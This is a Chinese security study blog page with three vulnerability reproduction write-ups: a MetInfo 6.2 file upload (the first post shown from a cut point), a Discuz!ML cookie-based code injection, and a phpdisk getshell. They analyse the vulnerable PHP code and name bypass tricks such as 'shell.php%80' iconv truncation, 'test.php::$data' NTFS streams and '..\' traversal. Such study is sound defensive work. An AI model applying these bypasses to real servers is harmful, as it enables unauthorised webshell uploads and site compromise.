&#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;format != <span class="string">""</span> &amp;&amp; !in_array(strtolower(<span class="keyword">$this</span>-&gt;ext), explode(<span class="string">'|'</span>,strtolower(<span class="keyword">$this</span>-&gt;format))) &amp;&amp; $filear) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error(<span class="keyword">$this</span>-&gt;ext.<span class="string">" &#123;$_M['word']['upfileTip3']&#125;"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//文件名重命名</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;set_savename($filear[<span class="string">"name"</span>], <span class="keyword">$this</span>-&gt;is_rename);</span><br><span class="line">		<span class="comment">//新建保存文件</span></span><br><span class="line">		<span class="keyword">if</span>(stripos(<span class="keyword">$this</span>-&gt;savepath, PATH_WEB.<span class="string">'upload/'</span>) !== <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error($_M[<span class="string">'word'</span>][<span class="string">'upfileFail2'</span>]);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strstr(<span class="keyword">$this</span>-&gt;savepath, <span class="string">'./'</span>))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error($_M[<span class="string">'word'</span>][<span class="string">'upfileTip3'</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!makedir(<span class="keyword">$this</span>-&gt;savepath)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error($_M[<span class="string">'word'</span>][<span class="string">'upfileFail2'</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//复制文件</span></span><br><span class="line">		$upfileok=<span class="number">0</span>;</span><br><span class="line">		$file_tmp=$filear[<span class="string">"tmp_name"</span>];</span><br><span class="line">		$file_name=<span class="keyword">$this</span>-&gt;savepath.<span class="keyword">$this</span>-&gt;savename;</span><br><span class="line">		<span class="keyword">if</span> (stristr(PHP_OS,<span class="string">"WIN"</span>)) &#123;</span><br><span class="line">			$file_name = @iconv(<span class="string">"utf-8"</span>,<span class="string">"GBK"</span>,$file_name);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (function_exists(<span class="string">"move_uploaded_file"</span>)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (move_uploaded_file($file_tmp, $file_name)) &#123;</span><br><span class="line">				$upfileok=<span class="number">1</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (copy($file_tmp, $file_name)) &#123;</span><br><span class="line">				$upfileok=<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">elseif</span> (copy($file_tmp, $file_name)) &#123;</span><br><span class="line">			$upfileok=<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!$upfileok) &#123;</span><br><span class="line">			<span class="keyword">if</span> (file_put_contents(<span class="keyword">$this</span>-&gt;savepath.<span class="string">'test.txt'</span>,<span class="string">'metinfo'</span>)) &#123;</span><br><span class="line">				$_M[<span class="string">'word'</span>][<span class="string">'upfileOver4'</span>]=$_M[<span class="string">'word'</span>][<span class="string">'upfileOver5'</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			unlink(<span class="keyword">$this</span>-&gt;savepath.<span class="string">'test.txt'</span>);</span><br><span class="line">			$errors = <span class="keyword">array</span>(<span class="number">0</span> =&gt; $_M[<span class="string">'word'</span>][<span class="string">'upfileOver4'</span>], <span class="number">1</span> =&gt;$_M[<span class="string">'word'</span>][<span class="string">'upfileOver'</span>], <span class="number">2</span> =&gt; $_M[<span class="string">'word'</span>][<span class="string">'upfileOver1'</span>], <span class="number">3</span> =&gt; $_M[<span class="string">'word'</span>][<span class="string">'upfileOver2'</span>], <span class="number">4</span> =&gt; $_M[<span class="string">'word'</span>][<span class="string">'upfileOver3'</span>], <span class="number">6</span>=&gt; $_M[<span class="string">'word'</span>][<span class="string">'upfileOver5'</span>], <span class="number">7</span>=&gt; $_M[<span class="string">'word'</span>][<span class="string">'upfileOver5'</span>]);</span><br><span class="line">			$filear[<span class="string">'error'</span>]=$filear[<span class="string">'error'</span>]?$filear[<span class="string">'error'</span>]:<span class="number">0</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error($errors[$filear[<span class="string">'error'</span>]]);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span>(stripos($filear[<span class="string">'tmp_name'</span>], PATH_WEB) === <span class="keyword">false</span>)&#123;</span><br><span class="line">				@unlink($filear[<span class="string">'tmp_name'</span>]); <span class="comment">//Delete temporary files</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		load::plugin(<span class="string">'doqiniu_upload'</span>,<span class="number">0</span>,<span class="keyword">array</span>(<span class="string">'savename'</span>=&gt;str_replace(PATH_WEB, <span class="string">''</span>, <span class="keyword">$this</span>-&gt;savepath).<span class="keyword">$this</span>-&gt;savename,<span class="string">'localfile'</span>=&gt;$file_name));</span><br><span class="line">		$back = <span class="string">'../'</span>.str_replace(PATH_WEB, <span class="string">''</span>, <span class="keyword">$this</span>-&gt;savepath).<span class="keyword">$this</span>-&gt;savename;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;sucess($back);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个函数对之前设置的参数进行检验过滤处理等等……<br><img src="/2019/07/12/metinfo-6-2前台任意文件上传漏洞复现/1.png" alt=""><br>相当严格的过滤，所以我们能上传的文件类型只能是白名单中的。</p>
<p>查看文件重命名操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;set_savename($filear[<span class="string">"name"</span>], <span class="keyword">$this</span>-&gt;is_rename);</span><br></pre></td></tr></table></figure></p>
<p>跟进查看函数set_savename()<br>定位：/app/system/include/module/upfile.class.php::354行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">set_savename</span><span class="params">($filename, $is_rename)</span> </span>&#123;</span><br><span class="line">	 <span class="keyword">if</span> ($is_rename) &#123;</span><br><span class="line">	 	... ...</span><br><span class="line">	 &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          $name_verification = explode(<span class="string">'.'</span>,$filename);</span><br><span class="line">	      $verification_mun = count($name_verification);</span><br><span class="line">		  <span class="keyword">if</span>($verification_mun&gt;<span class="number">2</span>)&#123;</span><br><span class="line">			$verification_mun1 = $verification_mun<span class="number">-1</span>;</span><br><span class="line">			$name_verification1 = $name_verification[<span class="number">0</span>];</span><br><span class="line">			<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$verification_mun1;$i++)&#123;</span><br><span class="line">				$name_verification1 .= <span class="string">'_'</span>.$name_verification[$i];</span><br><span class="line">			&#125;</span><br><span class="line">			$name_verification1 .= <span class="string">'.'</span>.$name_verification[$verification_mun1];</span><br><span class="line">			$filename = $name_verification1;</span><br><span class="line">	     &#125;</span><br><span class="line">    $filename = str_replace(<span class="keyword">array</span>(<span class="string">":"</span>, <span class="string">"*"</span>, <span class="string">"?"</span>, <span class="string">"|"</span>, <span class="string">"/"</span> , <span class="string">"\\"</span> , <span class="string">"\""</span> , <span class="string">"&lt;"</span> , <span class="string">"&gt;"</span> , <span class="string">"——"</span> , <span class="string">" "</span> ),<span class="string">'_'</span>,$filename);</span><br><span class="line">    ... ... </span><br><span class="line">    ... ...</span><br></pre></td></tr></table></figure></p>
<p>是否对文件名进行重命名操作，而这个操作的参数也是来自于用户输入<strong>$_M[‘form’]</strong><br>如果我们试图写入shell.php.jpg文件名，之后文件名会被改成shell_shell_php.jpg</p>
<p>查看新建保存文件功能，这里对文件路径进行验证，要以upload开头，并且不能有<strong>‘./‘</strong><br><strong>tip:CTF中，如果想绕过’./‘的过滤，在 windows 下可以使用’..\’来进行路径穿越</strong><br><img src="/2019/07/12/metinfo-6-2前台任意文件上传漏洞复现/2.png" alt=""></p>
<p>查看函数makedir()<br><img src="/2019/07/12/metinfo-6-2前台任意文件上传漏洞复现/3.png" alt=""><br>将会创建一个dir</p>
<p>接着漏洞引发点<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//复制文件</span></span><br><span class="line">		$upfileok=<span class="number">0</span>;</span><br><span class="line">		$file_tmp=$filear[<span class="string">"tmp_name"</span>];</span><br><span class="line">		$file_name=<span class="keyword">$this</span>-&gt;savepath.<span class="keyword">$this</span>-&gt;savename;</span><br><span class="line">		<span class="keyword">if</span> (stristr(PHP_OS,<span class="string">"WIN"</span>)) &#123;</span><br><span class="line">			$file_name = @iconv(<span class="string">"utf-8"</span>,<span class="string">"GBK"</span>,$file_name);</span><br><span class="line">		&#125;</span><br><span class="line">		...</span><br><span class="line">		...</span><br></pre></td></tr></table></figure></p>
<p>复制文件处<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name=<span class="keyword">$this</span>-&gt;savepath.<span class="keyword">$this</span>-&gt;savename;</span><br></pre></td></tr></table></figure></p>
<p>文件名由<strong>savepath</strong>和<strong>savename</strong>拼接而成<br>然后如果是windows系统就会通过<strong>iconv()</strong>函数转码，这个函数在win下，php版本小于5.4时，我使用5.3.将会出现截断，<br>比如shell.php%80xxxxxx,%80以后的内容会由于转码的问题，而被截断。<br>关于这个函数参考文章：<a href="https://www.cnblogs.com/milantgh/p/3602141.html?utm_source=tuicool" target="_blank" rel="noopener">PHP iconv函数字符串转码导致截断问题</a></p>
<p>然后后续函数中会将文件内容存入filename，这时候的filename,可以是我们指定的文件形式。由此写入文件</p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p><img src="/2019/07/12/metinfo-6-2前台任意文件上传漏洞复现/4.png" alt=""></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>学习到了iconv()函数，然后代码的理解以及逻辑结构，函数之间的关联的理解能力有待提高，要了解参数传入处<br>比如<strong>$_M[‘form’]</strong>，要会溯源，然后发现在common.inc.php有定义<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 获取GET,POST,COOKIE，存放在$_M['form']，系统表单提交变量数组</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure></p>
<p>所以还是要多学，多向身边的同学学习</p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/12/Discuz-ML-V3-X-代码注入分析/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cookie">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The clown is laughing at you">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/07/12/Discuz-ML-V3-X-代码注入分析/" class="post-title-link" itemprop="url">Discuz!ML V3.X 代码注入分析</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-07-12 13:39:59 / Geändert am: 20:34:00" itemprop="dateCreated datePublished" datetime="2019-07-12T13:39:59+08:00">2019-07-12</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>前言：</p>
<p>Discuz v3.4<br>ubuntu 1.9<br>mysql+apache2</p>
<h1 id="0x01-POC"><a href="#0x01-POC" class="headerlink" title="0x01 POC"></a>0x01 POC</h1><p>！<a href="Discuz-ML-V3-X-代码注入分析/1.png"></a><br>这个构造这样的payload,就能获取phpinfo,然后随便输点什么，使其报错。<br>！<a href="Discuz-ML-V3-X-代码注入分析/2.png"></a><br>根据debug报告我们开始溯源。</p>
<h1 id="0x02-分析漏洞"><a href="#0x02-分析漏洞" class="headerlink" title="0x02 分析漏洞"></a>0x02 分析漏洞</h1><p>定位：source/module/portal/portal_index.php::32行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include_once</span> template(<span class="string">'diy:portal/index'</span>);</span><br></pre></td></tr></table></figure></p>
<p>跟进函数<strong>template()</strong><br>定位：source\function\function_core.php::524行<br>根据报错信息中的<strong>data/template….</strong>尝试全局搜索这个字段，最终在这个函数中找到相关代码，位于文件::645行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vot*/	$cachefile = <span class="string">'./data/template/'</span>.DISCUZ_LANG.<span class="string">'_'</span>.(defined(<span class="string">'STYLEID'</span>) ? STYLEID.<span class="string">'_'</span> : <span class="string">'_'</span>).$templateid.<span class="string">'_'</span>.str_replace(<span class="string">'/'</span>, <span class="string">'_'</span>, $file).<span class="string">'.tpl.php'</span>;</span><br></pre></td></tr></table></figure></p>
<p>根据报错信息，我们修改的cookie值在<strong>DISCUZ_LANG</strong>得到体现，所以跟踪<strong>DISCUZ_LANG</strong><br>有两处分别位于<strong>restore.php</strong>和<strong>discuz_application.php</strong><br>此次漏洞位于<strong>discuz_application.php</strong>，跟踪至此，位于文件::341行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'DISCUZ_LANG'</span>, $lng);</span><br></pre></td></tr></table></figure></p>
<p>查看<strong>$lng</strong><br>！<a href="Discuz-ML-V3-X-代码注入分析/3.png"></a><br>看到本文件::305行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;var[<span class="string">'cookie'</span>][<span class="string">'language'</span>]) &#123;</span><br><span class="line">			$lng = strtolower(<span class="keyword">$this</span>-&gt;var[<span class="string">'cookie'</span>][<span class="string">'language'</span>]);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></p>
<p>故而<strong>$lng</strong>可控，<br>所以我们通过cookie写入命令，最终include_once()，执行代码注入。</p>
<h1 id="0x03-后话"><a href="#0x03-后话" class="headerlink" title="0x03 后话"></a>0x03 后话</h1><p>（1）学会使用debug的信息，去追溯源码<br>（2）学会使用phpstorm,发现这个真的很好用</p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/11/xxxdisk前台Getshell-复现/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cookie">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The clown is laughing at you">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/07/11/xxxdisk前台Getshell-复现/" class="post-title-link" itemprop="url">xxxdisk前台Getshell[复现]</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-07-11 17:47:53" itemprop="dateCreated datePublished" datetime="2019-07-11T17:47:53+08:00">2019-07-11</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Bearbeitet am</span>
                
                <time title="Geändert am: 2019-07-12 20:33:37" itemprop="dateModified" datetime="2019-07-12T20:33:37+08:00">2019-07-12</time>
              </span>
            
          

          

          
            
            
          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>跟着同学复现了一波,前台Getshell<br>参考链接:<br><a href="https://od0d.cn/2019/07/09/phpdisk%E5%89%8D%E5%8F%B0Getshell-%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">phpdisk前台Getshell(复现)</a><br><a href="https://xz.aliyun.com/t/5594#toc-1" target="_blank" rel="noopener">代码审计 xxxdisk前台Getshell</a></p>
<h1 id="0x01-准备"><a href="#0x01-准备" class="headerlink" title="0x01 准备"></a>0x01 准备</h1><p>选择的cms是phpdisk，在Windows平台的GBK版本上，挖掘到了一个无需登录的前台Getshell。</p>
<p>同学告诉我，在审计初，最好要看看该cms的路由和全局变量过滤情况<br>然后查看之后确实是存在文件dosafe.php，将所有sql注入的参数过滤了个遍。</p>
<h1 id="0x02-漏洞成因"><a href="#0x02-漏洞成因" class="headerlink" title="0x02 漏洞成因"></a>0x02 漏洞成因</h1><p>(1)从mydisk.php为权限判断未exit导致可以越权访问mydisk.php</p>
<p>(2)利用windows下的NTFS ADS流trick绕过文件名后缀限制</p>
<p>(3)通过phpdisk的版本iconv编码转化使用不当造成宽字节注入找到后台(已知漏洞)</p>
<h1 id="0x03-文件上传漏洞"><a href="#0x03-文件上传漏洞" class="headerlink" title="0x03 文件上传漏洞"></a>0x03 文件上传漏洞</h1><p>用户注册后尝试上传一个php文件，到服务器中查看该文件，会发现该文件被转成txt类型的文件<br><img src="/2019/07/11/xxxdisk前台Getshell-复现/1.png" alt=""></p>
<p>然后看看怎么绕过这个后缀限制,文件上传操作封装在函数<strong>upload_file()</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//phpdisk/includes/function/global.func.php</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">($source, $target)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (function_exists(<span class="string">'move_uploaded_file'</span>) &amp;&amp; @move_uploaded_file($source, $target)) &#123;</span><br><span class="line">		@chmod($target, <span class="number">0666</span>);</span><br><span class="line">		<span class="keyword">return</span> $target;</span><br><span class="line">	&#125; <span class="keyword">elseif</span> (@copy($source, $target)) &#123;</span><br><span class="line">		@chmod($target, <span class="number">0666</span>);</span><br><span class="line">		<span class="keyword">return</span> $target;</span><br><span class="line">	&#125; <span class="keyword">elseif</span> (@is_readable($source)) &#123;</span><br><span class="line">		<span class="keyword">if</span> ($fp = @fopen($source,<span class="string">'rb'</span>)) &#123;</span><br><span class="line">			@flock($fp,<span class="number">2</span>);</span><br><span class="line">			$filedata = @fread($fp,@filesize($source));</span><br><span class="line">			@fclose($fp);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ($fp = @fopen($target, <span class="string">'wb'</span>)) &#123;</span><br><span class="line">			@flock($fp, <span class="number">2</span>);</span><br><span class="line">			@fwrite($fp, $filedata);</span><br><span class="line">			@fclose($fp);</span><br><span class="line">			@chmod ($target, <span class="number">0666</span>);</span><br><span class="line">			<span class="keyword">return</span> $target;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>然後查看哪些地方調用了該函數，該函數調用有兩處，我們這次的漏洞在第一處，<br>位于<strong>phpdisk/modules/upload.inc.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码第70行</span></span><br><span class="line">...</span><br><span class="line">$file_ext = get_real_ext($file_extension);</span><br><span class="line">$dest_file = $file_real_path.$file_store_path.$file_real_name_store.$file_ext;</span><br><span class="line"><span class="keyword">if</span>(upload_file($file[<span class="string">'tmp_name'</span>],$dest_file))&#123;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>使用函数<strong>get_real_ext()</strong>来处理后缀<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//phpdisk/includes/function/global.func.php</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_real_ext</span><span class="params">($file_extension)</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $settings;</span><br><span class="line">	$file_extension = trim($file_extension);</span><br><span class="line">	<span class="keyword">if</span>($file_extension)&#123;</span><br><span class="line">		$exts = explode(<span class="string">','</span>,$settings[<span class="string">'filter_extension'</span>]);</span><br><span class="line">		<span class="keyword">if</span>(in_array($file_extension,$exts))&#123;</span><br><span class="line">			$file_ext = <span class="string">'.'</span>.$file_extension.<span class="string">'.txt'</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			$file_ext = <span class="string">'.'</span>.$file_extension;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$file_ext = <span class="string">'.txt'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $file_ext;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>使用黑名单filter_extension对后缀名进行修改添加<code>.txt</code>防止像php这样的恶意文件。<br>filter_extension位于：<code>/admin/setting.inc.php/38行</code><br>此处绕过的方法，是<strong>我们控制文件名为：<code>test.php::$data</code></strong>，就可以绕过。</p>
<p>原理：<br>php在window的时候如果文件名为：文件名+<strong>::$DATA</strong>，此时会把<strong>::$DATA</strong>之后的数据当成文件流处理,不会检测后缀名.且保持<strong>::$DATA</strong>之前的文件名。</p>
<p>参考:<a href="https://xz.aliyun.com/t/2539#toc-0" target="_blank" rel="noopener">渗透测试的WINDOWS NTFS技巧集合</a></p>
<h1 id="0x04-权限绕过"><a href="#0x04-权限绕过" class="headerlink" title="0x04 权限绕过"></a>0x04 权限绕过</h1><p>关键代码<code>mydisk.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">#	Project: PHPDISK File Storage Solution</span></span><br><span class="line"><span class="comment">#	This is NOT a freeware, use is subject to license terms.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#	Site: http://www.phpdisk.com</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#	$Id: mydisk.php 25 2014-01-10 03:13:43Z along $</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#	Copyright (C) 2008-2014 PHPDisk Team. All Rights Reserved.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"includes/commons.inc.php"</span>;</span><br><span class="line"></span><br><span class="line">phpdisk_core::user_login();</span><br><span class="line"></span><br><span class="line">define(<span class="string">'IN_MYDISK'</span> ,<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// fix firefox</span></span><br><span class="line"><span class="keyword">if</span>($item ==<span class="string">'upload'</span>)&#123;</span><br><span class="line">	$uid = (int)gpc(<span class="string">'uid'</span>,<span class="string">'GP'</span>,<span class="number">0</span>);</span><br><span class="line">	$pd_is_activated = @$db-&gt;result_first(<span class="string">"select is_activated from &#123;$tpf&#125;users where userid='$uid'"</span>);</span><br><span class="line">&#125;</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure></p>
<p>查看<code>phpdisk_core::user_login()</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">user_login</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $pd_uid,$pd_pwd;</span><br><span class="line">		<span class="keyword">if</span>(!$pd_uid || !$pd_pwd)&#123;</span><br><span class="line">			header(<span class="string">"Location: "</span>.urr(<span class="string">"account"</span>,<span class="string">"action=login&amp;ref="</span>.$_SERVER[<span class="string">'REQUEST_URI'</span>]));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>这里认证没有通过仅仅只是302，并没有退出程序，当时不理解302为什么可以？<br>同学告诉我，302的话，就算没有在没有注册的情况下，程序检测到后，不会强制退出程序，而是继续执行mydisk.php接下来的代码</p>
<h1 id="0x05-未授权上传"><a href="#0x05-未授权上传" class="headerlink" title="0x05 未授权上传"></a>0x05 未授权上传</h1><p><img src="/2019/07/11/xxxdisk前台Getshell-复现/2.png" alt=""><br>上传成功</p>
